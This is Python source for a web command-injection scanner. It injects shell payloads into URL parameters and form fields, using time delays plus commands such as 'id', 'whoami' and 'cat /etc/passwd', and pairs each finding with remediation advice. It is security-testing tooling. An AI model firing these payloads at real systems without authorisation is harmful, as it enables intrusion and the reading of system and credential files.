"""
Command Injection Scanner - Production Grade
Techniques: Error-based, Time-based (most reliable), Out-of-band indicators,
Blind detection via response diff, OS-specific payloads
"""
import requests, time, re, difflib
from urllib.parse import urlparse, parse_qs

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
}

# Time-based — most reliable, no false positives
TIME_PAYLOADS = [
    # Unix
    ("; sleep 4",                    "unix_semicolon"),
    ("| sleep 4",                    "unix_pipe"),
    ("& sleep 4",                    "unix_amp"),
    ("`sleep 4`",                    "unix_backtick"),
    ("$(sleep 4)",                   "unix_subshell"),
    (" || sleep 4 ||",               "unix_or"),
    (" && sleep 4 &&",               "unix_and"),
    ("\n sleep 4 \n",                "unix_newline"),
    # Windows
    ("& timeout /T 4 /NOBREAK",     "win_timeout"),
    ("| timeout /T 4 /NOBREAK",     "win_pipe_timeout"),
    ("& ping -n 5 127.0.0.1",       "win_ping"),
    ("; Start-Sleep -s 4",          "powershell_sleep"),
]

# Error-based — fast but more false positives, need strong pattern matching
ERROR_PAYLOADS = [
    # Unix output
    ("; id",         [r"uid=\d+\([a-z_]+\)\s+gid=\d+",        "unix_id"]),
    ("| id",         [r"uid=\d+\([a-z_]+\)\s+gid=\d+",        "unix_id_pipe"]),
    ("$(id)",        [r"uid=\d+\([a-z_]+\)\s+gid=\d+",        "unix_subshell_id"]),
    ("`id`",         [r"uid=\d+\([a-z_]+\)\s+gid=\d+",        "unix_backtick_id"]),
    ("; whoami",     [r"^(root|www-data|apache|nginx|nobody)$","unix_whoami"]),
    ("; cat /etc/passwd", [r"root:x:\d+:\d+:",               "unix_passwd"]),
    ("; uname -a",   [r"linux|gnu|debian|ubuntu|centos|redhat","unix_uname"]),
    # Windows output
    ("& whoami",     [r"(nt authority|iis apppool|network service)\\","win_whoami"]),
    ("& dir C:\\",   [r"directory of c:\\",                   "win_dir"]),
    ("& type C:\\Windows\\win.ini", [r"\[fonts\]|\[extensions\]","win_type"]),
    ("& ver",        [r"microsoft windows \[version",         "win_ver"]),
]

def req(method, url, data=None, params=None, timeout=12):
    try:
        t0 = time.time()
        kw = dict(headers=HEADERS, timeout=timeout, verify=False, allow_redirects=True)
        if method == "POST":
            r = requests.post(url, data=data, **kw)
        else:
            r = requests.get(url, params=params or data, **kw)
        return r, round(time.time()-t0, 3)
    except requests.Timeout:
        return None, timeout
    except:
        return None, 0

def test_command_injection(method, url, base_data, param):
    findings = []

    # Baseline
    r0, t0 = req(method, url,
                 data=base_data if method=="POST" else None,
                 params=base_data if method=="GET" else None)
    baseline_text = r0.text if r0 else ""

    # ── 1. Time-based (most reliable) ──────────────────────────────────
    for payload, ptype in TIME_PAYLOADS:
        d = base_data.copy()
        d[param] = base_data.get(param,"test") + payload
        _, elapsed = req(method, url,
                        data=d if method=="POST" else None,
                        params=d if method=="GET" else None,
                        timeout=14)

        # Must be 3.5-12s AND significantly longer than baseline
        if 3.5 <= elapsed <= 12 and elapsed >= t0 + 2.5:
            findings.append({
                "vuln_type": "Command Injection (Time-Based Blind)",
                "url": url, "parameter": param,
                "payload": payload, "severity": "Critical",
                "description": (
                    f"Blind command injection in '{param}' via {method}. "
                    f"Server delayed {elapsed:.1f}s (baseline: {t0:.1f}s) with sleep payload. "
                    f"OS command executed successfully — full RCE likely possible."
                ),
                "recommendation": (
                    "1. NEVER pass user input to OS commands. "
                    "2. Use language-native APIs instead (os.listdir() not shell ls). "
                    "3. If unavoidable, use subprocess with shell=False and explicit argument list. "
                    "4. Whitelist allowed characters with strict regex. "
                    "5. Run application with minimal OS privileges."
                )
            })
            return findings
        time.sleep(0.1)

    # ── 2. Error-based (fast confirmation) ─────────────────────────────
    for payload, (pattern, ptype) in [(e[0], e[1]) for e in ERROR_PAYLOADS]:
        d = base_data.copy()
        d[param] = base_data.get(param,"test") + payload
        r, _ = req(method, url,
                   data=d if method=="POST" else None,
                   params=d if method=="GET" else None)
        if not r: continue
        if r.text == baseline_text: continue

        match = re.search(pattern, r.text, re.IGNORECASE | re.MULTILINE)
        if match:
            # Verify not in baseline
            if not re.search(pattern, baseline_text, re.IGNORECASE):
                findings.append({
                    "vuln_type": "Command Injection (Error-Based)",
                    "url": url, "parameter": param,
                    "payload": payload, "severity": "Critical",
                    "description": (
                        f"Command injection confirmed in '{param}' via {method}. "
                        f"OS command output: '{match.group(0)[:80]}'. "
                        f"Technique: {ptype}. Attacker has Remote Code Execution."
                    ),
                    "recommendation": (
                        "1. NEVER concatenate user input into shell commands. "
                        "2. Use subprocess with shell=False. "
                        "3. Validate input against strict whitelist. "
                        "4. Disable dangerous PHP functions (exec, system, passthru)."
                    )
                })
                return findings
        time.sleep(0.05)

    return findings

def run_cmd_scan(crawl_data, timeout=12):
    findings, seen = [], set()

    for page in crawl_data:
        # URL params
        parsed = urlparse(page["url"])
        qs = {k: v[0] for k,v in parse_qs(parsed.query).items()}
        if qs:
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in list(qs.keys())[:4]:
                key = f"{base_url}:{param}"
                if key in seen: continue
                for f in test_command_injection("GET", base_url, qs, param):
                    seen.add(key); findings.append(f)

        # Forms
        for form in page.get("forms",[]):
            action = form.get("action") or page["url"]
            method = form.get("method","GET").upper()
            inputs = [i for i in form.get("inputs",[])
                     if i.get("name") and i.get("type","text") not in
                     ["submit","button","hidden","file"]]
            if not inputs: continue

            base_data = {i["name"]: i.get("value") or "test" for i in inputs}
            for inp in inputs[:4]:
                key = f"{action}:{inp['name']}"
                if key in seen: continue
                for f in test_command_injection(method, action, base_data, inp["name"]):
                    seen.add(key); findings.append(f)

    return findings
